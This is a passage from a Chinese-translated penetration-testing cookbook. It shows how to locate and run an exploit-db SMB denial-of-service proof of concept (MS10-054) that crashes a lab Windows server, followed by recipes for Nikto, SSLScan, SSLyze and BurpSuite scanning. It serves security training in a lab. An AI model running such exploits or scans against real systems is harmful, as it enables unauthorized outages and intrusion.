12273,platforms/windows/dos/12273.py,"Windows 7/2008R2 SMB Client Trans2 Stack Overflow 10-020 PoC",2010-04-17,"Laurent Gaffie",windows,dos,0 
```

在提供的示例中，我们依次使用两个独立的`grep`函数，来搜索与 SMB 服务相关的任何 DoS 漏洞：

```
root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv | grep dos | grep py | grep -v "Windows 7" 
12258,platforms/windows/dos/12258.py,"Proof of Concept for MS10-006 SMB Client-Side Bug",2010-04-16,"Laurent Gaffie",windows,dos,0 
12524,platforms/windows/dos/12524.py,"Windows SMB2 Negotiate Protocol (0x72) Response DOS",2010-05-07,"Jelmer de Hen",windows,dos,0 
14607,platforms/windows/dos/14607.py,"Microsoft SMB Server Trans2 Zero Size Pool Alloc (MS10-054)",2010-08-10,"Laurent Gaffie",windows,dos,0 
```

我们可以继续缩小搜索结果，使其尽可能具体。 在提供的示例中，我们查找了 SMB 服务的任何 Python DoS 脚本，但是我们寻找的不是 Windows 7 平台的。 `gre`p 中的`-v`选项可用于从结果中排除内容。 通常最好将所需的漏洞利用复制到另一个位置，以便不会修改 exploit 数据库目录的内容：

```
root@KaliLinux:~# mkdir smb_exploit 
root@KaliLinux:~# cd smb_exploit/ 
root@KaliLinux:~/smb_exploit# cp /usr/share/exploitdb/platforms/windows/ dos/14607.py /root/smb_exploit/ 
root@KaliLinux:~/smb_exploit# ls 14607.py

```

在提供的示例中，我们为脚本创建一个新目录。 然后从绝对路径复制脚本，该路径可以由 exploit-db 的目录位置和`files.csv`文件中定义的相对路径推断。 一旦重新定位，就可以使用`cat`命令从上到下读取脚本，然后将脚本的内容传递给`more`工具：

```
root@KaliLinux:~/smb_exploit# cat 14607.py | more ?

#!/usr/bin/env python 
import sys,struct,socket 
from socket import *

if len(sys.argv)<=2:   
    print '############################################################### ########'   
    print '#   MS10-054 Proof Of Concept by Laurent Gaffie'   
    print '#   Usage: python '+sys.argv[0]+' TARGET SHARE-NAME (No backslash)'   
    print '#   Example: python '+sys.argv[0]+' 192.168.8.101 users'   
    print '#   http://g-laurent.blogspot.com/'   
    print '#   http://twitter.com/laurentgaffie'   
    print '#   Email: laurent.gaffie{at}gmail{dot}com'   
    print '############################################################### ########\n\n'   
    sys.exit() 
```

与 NSE 脚本和 Metasploit 辅助模块不同，漏洞数据库中的脚本没有标准化格式。 因此，使用漏洞有时会很棘手。 尽管如此，查看脚本内容中的为注释或使用说明通常是有帮助的。 在提供的示例中，我们可以看到，使用情况列在脚本的内容中，如果未提供适当数量的参数，也会将其打印给用户。 评估之后，可以执行脚本。

```
root@KaliLinux:~/smb_exploit# ./14607.py 
./14607.py: line 1: ?#!/usr/bin/env: No such file or directory 
import.im6: unable to open X server `' @ error/import.c/ 
ImportImageCommand/368. 
from: can't read /var/mail/socket 
./14607.py: line 4: $'\r': command not found 
./14607.py: line 5: syntax error near unexpected token `sys.argv' 
'/14607.py: line 5: `if len(sys.argv)<=2:

```

但是，在尝试执行脚本后，我们可以看到出现了问题。 由于缺乏标准化，并且由于一些脚本只是概念证明，通常需要对这些脚本进行调整：

```py
?#!/usr/bin/env python 
import sys,struct,socket 
from socket import * 
```

在脚本错误出现后，我们需要返回到文本编辑器，并尝试确定错误的来源。 第一个错误表明，在脚本开头列出的 Python 解释器的位置存在问题。 这必须改变为指向 Kali Linux 文件系统中的解释器：

```py
#!/usr/bin/python 
import sys,struct,socket 
from socket import * 
```

在每个问题解决后，尝试再次运行脚本通常是个好主意，有时，修复单个问题会消除多个执行错误。 这里，在更改 Python 解释器的位置后，我们可以成功运行脚本：

```
root@KaliLinux:~/smb_exploit# ./14607.py 172.16.36.134 users 
[+]Negotiate Protocol Request sent 
[+]Malformed Trans2 packet sent 
[+]The target should be down now 
```

当脚本运行时，会返回几个消息来标识脚本执行的进度。 最后一条消息表明恶意的载荷已传送，服务器应该已经崩溃。 该脚本的成功执行可以通过返回 Windows 服务器来验证，它现在已经崩溃，并显示了 BSOD：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/6-9-1.jpg)

### 工作原理

本练习中演示的 exploit-db DoS 脚本是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。


# 第七章：Web 应用扫描

> 作者：Justin Hutchens

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

近几年来，我们看到越来越多的媒体报导了大公司和政府的数据泄露。并且，随着公众对安全的意思逐渐增强，通过利用标准的周边服务来潜入组织的网络越来越困难。和这些服务相关的公开漏洞通常很快会打上补丁，不可能用于攻击。相反，Web 应用通常包含自定义代码，它们通常不会拥有和来自独立厂商的网络服务相同的安全审计。Web 应用通常是组织外围的脆弱点，因为如此，这些服务的适当扫描和评估相当重要。

在详细讲解每个秘籍之前，我们会讨论一些关于 BurpSuite 和 sqlmap 的常见信息，因为这些工具在贯穿本章的多个秘籍中都相当重要。BurpSuite 是 Kali 自带的基于 Java 的图形化工具，用于记录、拦截和操作客户端浏览器和远程 Web 服务之间的请求和响应。它可能是用于 Web 应用渗透测试的最强大的工具之一，因为让攻击者能够完全控制如何和远程 Web 服务器通信。它可以操作大量事先在用户浏览器或会话中定义好的信息。sqlmap 是 Kali 中的继承命令行工具，它通过自动化整个流程，极大降低利用 SQL 注入漏洞所需的精力。sqlmap 的工作方式是提交来自已知 SQL 注入查询的大量列表的请求。它在数年间已经高度优化，可以基于之前请求的响应来智能尝试注入。

## 7.1 使用 Nikto 扫描 Web 应用

Nikto 是 Kali 中的命令行工具，用于评估 Web 应用的已知安全问题。Nikto 爬取目标站点并生成大量预先准备的请求，尝试识别应用中存在的危险脚本和文件。这个秘籍中，我们会讨论如何针对 Web 应用执行 Nikto，以及如何解释结果。

### 准备

为了使用 Nikto 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

### 操作步骤

和执行 Nikto 相关的复杂语法和用法，很大程度上取决于目标应用的本质。为了查看用法和语法的概览，使用`nikto -help`命令。在所提供的第一个例子中，我们对`google.com`进行扫描。`-host`参数可以用于指定需要扫描的目标的主机名称。`-port`选项定义了 Web 服务所运行的端口。`-ssl`选项告诉 Nikto 在扫描之前，与目标服务器建立 SSL/TLS 会话。

```
root@KaliLinux:~# nikto -host google.com -port 443 -ssl 
- Nikto v2.1.4 
-------------------------------------------------------------------------
+ Target IP:          74.125.229.161 
+ Target Hostname:    google.com 
+ Target Port:        443 
-------------------------------------------------------------------------
+ SSL Info:        Subject: /C=US/ST=California/L=Mountain View/O=Google Inc/CN=*.google.com
                   Ciphers: ECDHE-RSA-AES128-GCM-SHA256                   
                   Issuer:  /C=US/O=Google Inc/CN=Google Internet Authority G2 
+ Start Time:         2014-03-30 02:30:10 
-------------------------------------------------------------------------
+ Server: gws 
+ Root page / redirects to: https://www.google.com/ 
+ Server banner has changed from gws to GFE/2.0, this may suggest a WAF or load balancer is in place 
                                  ** {TRUNCATED} **
```

作为替代，`-host`参数可以用于定义目标系统的 IP 地址。`-nossl`参数可以用于告诉 Nikto 不要使用任何传输层的安全。`-vhost`选项用于指定 HTTP 请求中的主机协议头的值。在多个虚拟主机名称托管在单个 IP 地址上的时候，这非常有用。看看下面的例子：

```
root@KaliLinux:~# nikto -host 83.166.169.228 -port 80 -nossl -vhost packtpub.com 
- Nikto v2.1.4
-------------------------------------------------------------------------
+ Target IP:          83.166.169.228 
+ Target Hostname:    packtpub.com 
+ Target Port:        80 
+ Start Time:         2014-03-30 02:40:29 
-------------------------------------------------------------------------
+ Server: Varnish 
+ Root page / redirects to: http://www.packtpub.com/ 
+ No CGI Directories found (use '-C all' to force check all possible dirs) 
+ OSVDB-5737: WebLogic may reveal its internal IP or hostname in the Location header. The value is "http://www.packtpub.com." 
```

在上面的例子中，Nikto 对 Metasploitable2 系统上托管的 Web 服务执行了扫描。`-port`参数没有使用，因为 Web 服务托管到 TCP 80 端口上，这是 HTTP 的默认端口。此外，`-nossl`参数也没有使用，因为通常 Nikto 不会尝试 80 端口上的 SSL/TLS 连接。考虑下面的例子：

```
root@KaliLinux:~# nikto -host 172.16.36.135 
- Nikto v2.1.4 
-------------------------------------------------------------------------
+ Target IP:          172.16.36.135 
+ Target Hostname:    172.16.36.135 
+ Target Port:        80 
+ Start Time:         2014-03-29 23:54:28 
-------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) DAV/2 
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10 
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current. 
+ DEBUG HTTP verb may show server debugging information. See http://msdn. microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details. 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3233: /phpinfo.php: Contains PHP configuration information 
+ OSVDB-3268: /doc/: Directory indexing found. 
+ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/ doc. 
+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. 
+ OSVDB-3092: /phpMyAdmin/: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. 
+ OSVDB-3268: /test/: Directory indexing found. 
+ OSVDB-3092: /test/: This might be interesting... 
+ OSVDB-3268: /icons/: Directory indexing found. 
+ OSVDB-3233: /icons/README: Apache default file found. 
+ 6448 items checked: 1 error(s) and 13 item(s) reported on remote host 
+ End Time:           2014-03-29 23:55:00 (32 seconds) 
-------------------------------------------------------------------------
+ 1 host(s) tested
```

Nikto 的 Metasploitable2 扫描结果展示了一些经常被 Nikto 识别的项目。这些项目包括危险的 HTTP 方法，默认的安装文件，暴露的目录列表，敏感信息，以及应该被限制访问的文件。注意这些文件通常对于获取服务器访问以及寻找服务器漏洞很有帮助。

### 工作原理

Nikto 识别潜在的可疑文件，通过引用`robots.txt`，爬取网站页面，以及遍历包含敏感信息、漏洞内容，或者由于内容的本质或所表现的功能而应该被限制的已知文件列表。

## 7.2 使用 SSLScan 扫描 SSL/TLS

SSLScan 是 Kali 中的集成命令行工具，用于评估远程 Web 服务的 SSL/TLS 的安全性。这个秘籍中，我们会讨论如何对 Web 应用执行 SSLScan，以及如何解释或操作输出结果。

### 准备

为了使用 SSLScan 对目标执行 SSL/TLS 分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

### 操作步骤

SSLScan 是个高效的工具，用于对目标 Web 服务执行精简的 SSL/TLS 配置分析。为了对带有域名 Web 服务执行基本的扫描，只需要将域名作为参数传递给它，就像这样：

```
root@KaliLinux:~# sslscan google.com
                   _
           ___ ___| |___  ___ __ _ _ __ 
          / __/ __| / __|/ __/ _` | '_ \
          \__ \__ \ \__ \ (_| (_| | | | |
          |___/___/_|___/\___\__,_|_| |_|
                  
                  Version 1.8.2
            http://www.titania.co.uk
       Copyright Ian Ventura-Whiting 2009
       
Testing SSL server google.com on port 443  
  Supported Server Cipher(s):    
    Failed    SSLv3  256 bits  ECDHE-RSA-AES256-GCM-SHA384    
    Failed    SSLv3  256 bits  ECDHE-ECDSA-AES256-GCM-SHA384    
    Failed    SSLv3  256 bits  ECDHE-RSA-AES256-SHA384    
    Failed    SSLv3  256 bits  ECDHE-ECDSA-AES256-SHA384    
    Accepted  SSLv3  256 bits  ECDHE-RSA-AES256-SHA    
    Rejected  SSLv3  256 bits  ECDHE-ECDSA-AES256-SHA    
    Rejected  SSLv3  256 bits  SRP-DSS-AES-256-CBC-SHA    
    Rejected  SSLv3  256 bits  SRP-RSA-AES-256-CBC-SHA    
    Failed    SSLv3  256 bits  DHE-DSS-AES256-GCM-SHA384    
    Failed    SSLv3  256 bits  DHE-RSA-AES256-GCM-SHA384
    Failed    SSLv3  256 bits  DHE-RSA-AES256-SHA256    
    Failed    SSLv3  256 bits  DHE-DSS-AES256-SHA256    
    Rejected  SSLv3  256 bits  DHE-RSA-AES256-SHA    
    Rejected  SSLv3  256 bits  DHE-DSS-AES256-SHA    
    Rejected  SSLv3  256 bits  DHE-RSA-CAMELLIA256-SHA    
    Rejected  SSLv3  256 bits  DHE-DSS-CAMELLIA256-SHA 
                            ** {TRUNCATED} **
```

在执行时，SSLScan 会快速遍历目标服务器的连接，并且枚举所接受的密文，首选的密文族，以及 SSL 证书信息。可以用`grep`在输出中寻找所需信息。在下面的例子中，`grep`仅仅用于查看接受的密文。

```
root@KaliLinux:~# sslscan google.com | grep Accepted    
    Accepted  SSLv3  256 bits  ECDHE-RSA-AES256-SHA    
    Accepted  SSLv3  256 bits  AES256-SHA    
    Accepted  SSLv3  168 bits  ECDHE-RSA-DES-CBC3-SHA    
    Accepted  SSLv3  168 bits  DES-CBC3-SHA    
    Accepted  SSLv3  128 bits  ECDHE-RSA-AES128-SHA    
    Accepted  SSLv3  128 bits  AES128-SHA    
    Accepted  SSLv3  128 bits  ECDHE-RSA-RC4-SHA    
    Accepted  SSLv3  128 bits  RC4-SHA    
    Accepted  SSLv3  128 bits  RC4-MD5    
    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    
    Accepted  TLSv1  256 bits  AES256-SHA    
    Accepted  TLSv1  168 bits  ECDHE-RSA-DES-CBC3-SHA    
    Accepted  TLSv1  168 bits  DES-CBC3-SHA    
    Accepted  TLSv1  128 bits  ECDHE-RSA-AES128-SHA    
    Accepted  TLSv1  128 bits  AES128-SHA    
    Accepted  TLSv1  128 bits  ECDHE-RSA-RC4-SHA    
    Accepted  TLSv1  128 bits  RC4-SHA    
    Accepted  TLSv1  128 bits  RC4-MD5 
```

多个`grep`函数可以进一步过滤输出。通过使用多个`grep`管道请求，下面例子中的输出限制为 256 位密文，它可以被服务器接受。

```
root@KaliLinux:~# sslscan google.com | grep Accepted | grep "256 bits"    
    Accepted  SSLv3  256 bits  ECDHE-RSA-AES256-SHA    
    Accepted  SSLv3  256 bits  AES256-SHA
    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    
    Accepted  TLSv1  256 bits  AES256-SHA
```

SSLScan 提供的一个独特的功能就是 SMTP 中的`STARTTLS `请求的实现。这允许 SSLScan 轻易并高效地测试邮件服务的传输安全层，通过使用`--starttls `参数并随后指定目标 IP 地址和端口。下面的例子中，我们使用 SSLScan 来判断 Metasploitable2 所集成的 SMTP 服务是否支持任何脆弱的 40 位密文：

```
root@KaliLinux:~# sslscan --starttls 172.16.36.135:25 | grep Accepted | grep "40 bits"    
    Accepted  TLSv1  40 bits   EXP-EDH-RSA-DES-CBC-SHA    
    Accepted  TLSv1  40 bits   EXP-ADH-DES-CBC-SHA    
    Accepted  TLSv1  40 bits   EXP-DES-CBC-SHA    
    Accepted  TLSv1  40 bits   EXP-RC2-CBC-MD5    
    Accepted  TLSv1  40 bits   EXP-ADH-RC4-MD5    
    Accepted  TLSv1  40 bits   EXP-RC4-MD5
```

### 工作原理

SSL/TLS 会话通常通过客户端和服务端之间的协商来建立。这些协商会考虑到每一端配置的密文首选项，并且尝试判断双方都支持的最安全的方案。SSLScan 的原理是遍历已知密文和密钥长度的列表，并尝试使用每个配置来和远程服务器协商会话。这允许 SSLScan 枚举受支持的密文和密钥。

## 7.3 使用 SSLyze 扫描 SSL/TLS

SSLyze 是 Kali 中的集成命令行工具，用于评估远程 Web 服务的 SSL/TLS 的安全性。这个秘籍中，我们会讨论如何对 Web 应用执行 SSLyze，以及如何解释或操作输出结果。

### 准备

为了使用 SSLScan 对目标执行 SSL/TLS 分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

### 操作步骤

另一个用于对 SSL/TLS 配置执行彻底排查和分析的工具就是 SSLyze。为了使用 SSLyze 执行基本的测试，需要包含目标服务器作为参数，以及`--regular`参数。这包括 SSLv2、SSLv3、TLSv1、renegotiation、resumption、证书信息、HTTP GET 响应状态码，以及压缩支持的测试。

```
root@KaliLinux:~# sslyze google.com --regular

 REGISTERING AVAILABLE PLUGINS 
 ----------------------------

 PluginSessionResumption  
 PluginCertInfo  
 PluginOpenSSLCipherSuites  
 PluginSessionRenegotiation  
 PluginCompression

 CHECKING HOST(S) AVAILABILITY 
 ----------------------------
 
   google.com:443                      => 74.125.226.166:443
   
 SCAN RESULTS FOR GOOGLE.COM:443 - 74.125.226.166:443 ---------------------------------------------------
 
  * Compression :
        Compression Support:      Disabled
        
  * Certificate :      
      Validation w/ Mozilla's CA Store:  Certificate is Trusted                   
      Hostname Validation:               OK - Subject Alternative Name Matches      
      SHA1 Fingerprint:                  EF8845009EED2B2FE95D23318C8CF30F1052B596
      Common Name:                       *.google.com                             
      Issuer:                            /C=US/O=Google Inc/CN=Google Internet Authority G2      Serial 
      Number:                     5E0EFAF2A99854BD                         Not 
      Before:                        Mar 12 09:53:40 2014 GMT                 
      Not After:                         Jun 10 00:00:00 2014 GMT                 
      Signature Algorithm:               sha1WithRSAEncryption                    
      Key Size:                          2048                                     
      X509v3 Subject Alternative Name:   DNS:*.google.com, DNS:*. android.com, DNS:*.appengine.google.com, DNS:*.cloud.google.com, DNS:*. google-analytics.com, DNS:*.google.ca, DNS:*.google.cl, DNS:*.google. co.in, DNS:*.google.co.jp, DNS:*.google.co.uk, DNS:*.google.com.ar, DNS:*.google.com.au, DNS:*.google.com.br, DNS:*.google.com.co, DNS:*. google.com.mx, DNS:*.google.com.tr, DNS:*.google.com.vn, DNS:*.google. de, DNS:*.google.es, DNS:*.google.fr, DNS:*.google.hu, DNS:*.google. it, DNS:*.google.nl, DNS:*.google.pl, DNS:*.google.pt, DNS:*.googleapis. cn, DNS:*.googlecommerce.com, DNS:*.googlevideo.com, DNS:*.gstatic.com, DNS:*.gvt1.com, DNS:*.urchin.com, DNS:*.url.google.com, DNS:*.youtubenocookie.com, DNS:*.youtube.com, DNS:*.youtubeeducation.com, DNS:*.ytimg. com, DNS:android.com, DNS:g.co, DNS:goo.gl, DNS:google-analytics.com, DNS:google.com, DNS:googlecommerce.com, DNS:urchin.com, DNS:youtu.be, DNS:youtube.com, DNS:youtubeeducation.com 
                                  ** {TRUNCATED} **
```

作为替代，TLS 或者 SSL 的单个版本可以被测试来枚举和版本相关的所支持的密文。下面的例子中，SSLyze 用于枚举受 TLSv1.2 支持的密文，之后使用`grep`来提取出 256 位的密文。

```
root@KaliLinux:~# sslyze google.com --tlsv1_2 | grep "256 bits"        
    ECDHE-RSA-AES256-SHA384  256 bits                                                 
    ECDHE-RSA-AES256-SHA     256 bits                                                 
    ECDHE-RSA-AES256-GCM-SHA384256 bits                                                 
    AES256-SHA256            256 bits                                                 
    AES256-SHA               256 bits                                                 
    AES256-GCM-SHA384        256 bits
```

SSLyze 支持的一个非常拥有的特性是 Zlib 压缩的测试。如果开启了压缩，会直接关系到信息列楼漏洞，被称为`Compression Ratio Info-leak Made Easy`（CRIME）。这个测试可以使用`--comprision`参数来执行：

```
root@KaliLinux:~# sslyze google.com --compression
 
 CHECKING HOST(S) AVAILABILITY
 ----------------------------
   
   google.com:443                      => 173.194.43.40:443
 
 SCAN RESULTS FOR GOOGLE.COM:443 - 173.194.43.40:443 --------------------------------------------------
  
  * Compression :        Compression Support:      Disabled 
                                             ** {TRUNCATED} **
```

### 工作原理

SSL/TLS 会话通常通过客户端和服务端之间的协商来建立。这些协商会考虑到每一端配置的密文首选项，并且尝试判断双方都支持的最安全的方案。SSLyze 的原理是遍历已知密文和密钥长度的列表，并尝试使用每个配置来和远程服务器协商会话。这允许 SSLyze 枚举受支持的密文和密钥。

## 7.4 使用 BurpSuite 确定 Web 应用目标

在执行渗透测试的时候，确保你的攻击仅仅针对目标系统非常重要。针对额外目标的攻击可能导致法律问题。为了使损失最小，在 Burp Suite 中确定你的范围十分重要。这个秘籍中，我们会讨论如何使用 BurpSuite 确定范围内的目标。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

BurpSuite 的最左边的标签页就是`Target`。这个标签页的底下有两个标签页，包括`Site Map`和`Scope`。在通过设置代理的 Web 浏览器访问时，`SiteMap`标签页会自动填充。`Scope`标签页允许用户配置站点和其内容，来包含或者排除站点。为了向评估范围内添加新的站点，点击`Include in Scope`表格下的`Add`按钮。像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-4-1.jpg)

所添加的内容通常是 IP 地址范围，或者由单独的文件指定。`Protocal`选项会显示下拉菜单，包含 ANY、HTTP、HTTPS。`Host or IP range`字段可以包含单个主机名称，单个 IP，或者 IP 范围。此外，也存在`Port`和`File`的文本字段。字段可以留空，或者用于指定范围。字段应该使用正则表达式来填充。在所提供的例子中，脱字符（`^`）是正则表达式的开始，美元符号用于闭合正则表达式，反斜杠用于转移特殊字符`.`，它用于分隔 IP 地址的段。正则表达式的用法并不在本书的范围内，但是许多互联网上的开放资源都解释了它们的用法。你可以访问`http://www.regularexpressions.info/`来熟悉一下正则表达式。

### 工作原理

正则表达式在逻辑上定义条件，通过指定主机、端口或范围中包含的文件。定义评估范围会影响它在和 Web 内容交互时的操作方式。BurpSuite 配置定义了可以执行什么操作，它们位于范围内，以及什么不能执行，它们在范围之外。

## 7.5 使用 BurpSuite 蜘蛛

为了有效供给 Web 应用，了解服务器上所托管的 Web 内容非常重要。可以使用做种技巧来探索 Web 应用的整个攻击面。蜘蛛工具可以用于快速识别 Web 应用中引用的链接内容。这个秘籍中，我们会谈论如何使用 BurpSuite 爬取 Web 应用来识别范围内的内容。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

为了自动化爬取之前定义的范围内的内容，点击屏幕顶端的`Spider`标签页。下面会有两个额外的标签页，包括`Control`和`Options`。`Options`标签页允许用户配置蜘蛛如何指定。这包括详细设置、深度、限制、表单提交以及其它。考虑自动化蜘蛛的配置非常重要，因为它会向范围内的所有 Web 内容发送请求。这可能会破坏甚至是损坏一些 Web 内容。一旦拍治好了，`Control`标签页可以用于选择开始自动化爬取。通常，`Spider`标签页是暂停的，点击按钮可以启动蜘蛛。`Target`标签页下面的`Site Map`标签页会在蜘蛛爬取过程中自动更新。像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-5-1.jpg)

取决于所定义的配置，对于任何爬取过程中碰到的表单，BurpSuite 会请求你的反应。输入表单需要的参数，或者通过`Ignore Form`按钮来跳过表单，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-5-2.jpg)

作为替代，你可以通过右击`Site Map`标签页中的爬取特定位置，之后点击`Spider`，从特定位置开始爬取。这会递归爬取所选对象以及所包含的任何文件或目录。像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-5-3.jpg)

### 工作原理

BurpSuite 蜘蛛工具的工作原理是解析所有已知的 HTML 内容，并提取指向其它内容的链接。链接内容随后会用于分析所包含的其它链接内容。这个过程会无限继续下去，并只由可用的链接内容总数，指定的深度，以及处理额外请求的当前线程数量所限制。

## 7.6 使用 BurpSuite 参与工具

BurpSuite 也拥有可以用于基本的信息收集和目标分析的工具。这些工具叫做参与工具。这个秘籍中，我们会谈论如何使用这些 BurpSuite 中补充的参与工具来收集或组织目标的信息。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

参与工具可以通过邮寄站点地图中的任何对象，之后下拉扩展惨淡并选择所需工具来访问。通常，所选的参与工具会递归定位所选目标，来包含所有文件和目录。像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-6-1.jpg)

我们会以每个工具出现在菜单中的顺序来着重讲解它们。出于组织原因，我认为最好在下列重点中介绍它们：

+   `Search`（搜索）：这个工具可用于搜索术语、短语和正则表达式。它会返回任何包含查询术语的 HTTP 请求或响应。对于每个返回的项目，所查询的术语会高亮显示。

+   `Find comments`（发现注释）：这个工具在所有 JS、HTML 和其它源代码中搜索，浏览指定的 Web 内容并定位所有注释。这些只是可以导出便于之后复查。这有时候特别有用，因为开发者经常会在注释中留下敏感信息。

+   `Find scripts`（发现脚本）：这个工具会识别 Web 内容中的任何客户端和服务端的脚本。

+   `Find reference`（发现引用）：这个工具会解析所有 HTML 内容并识别其它的被引用内容。

+   `Analyse target`（分析目标）：这个工具会识别所有动态内容，静态内容和指定 Web 内容所带的参数。这在组织 Web 应用测试，并且应用带有大量的参数和动态内容时，十分有用。

+   `Discover content`（探索内容）：这个工具可以用于爆破目录和文件名，通过循环遍历单词列表和已知的文件扩展名列表。

+   `Schedule task`（计划任务）：这个工具允许用户定义时间和日期，在 BurpSuite 中开始和停止多种任务。

+   `Simulate manual testing`（模拟手动访问）：这个工具是一个不错的方式，就像是你在执行 Web 站点的手动分析那样，而你实际上可以去喝咖啡和吃甜甜圈。这个工具其实没有什么实际功能，主要是迷惑你的老板。

### 工作原理

BurpSuite 参与工具以多种方式工作，取决于所使用的工具。许多参与工具执行功能搜索，并检测已收到的响应中的特定信息。`Discover content `工具通过循环遍历定义好的列表，爆破文件和目录名称，提供了探索新的 Web 内容的功能。

## 7.7 使用 BurpSuite Web 代理

虽然它有许多可用工具，BurpSuite 的主要功能就是拦截代理。这就是说，BurpSuite 拥有捕获请求和响应的功能，以及随后操作它们来将其转发到目的地。这个秘籍中，我们会讨论如何使用 BurpSuite 拦截或记录请求。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

BurpSuite 的功能可以以被动或拦截模式使用。如果禁用了拦截器，所有请求和响应都会简单记录到`HTTP History`（HTTP 历史）标签页中。可以从列表中选择它们，来浏览它们或查看任何请求或响应的细节，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-7-1.jpg)

作为替代，`Intercept`（拦截器）按钮可以按下来捕获发送过程中的流量。这些请求可以在`Proxy`标签页中操作，之后会转发到目的地，或者丢弃。通过选择`Opyions`标签页，拦截器代理可以重新配置来定义所拦截的请求类型，或者甚至在响应到达浏览器之前拦截它们，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-7-2.jpg)

### 工作原理

BurpSuite 代理可以拦截或被动记录浏览器接受或发送的流量，因为它逻辑上配置在浏览器和任何远程设置之间。浏览器被配置来将所有请求发送给 Burp 的代理，之后代理会将它们转发给任何外部主机。由于这个配置，Burp 就可以捕获两边的发送中的请求和响应，或者记录所有发往或来自客户端浏览器的通信。

## 7.8 使用 BurpSuite Web 应用扫描器

BurpSuite 可以用作高效的 Web 应用漏洞扫描器。这个特性可以用于执行被动分析和主动扫描。这个秘籍中，我们会谈论如何使用 BurpSuite 执行被动和主动漏洞扫描。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

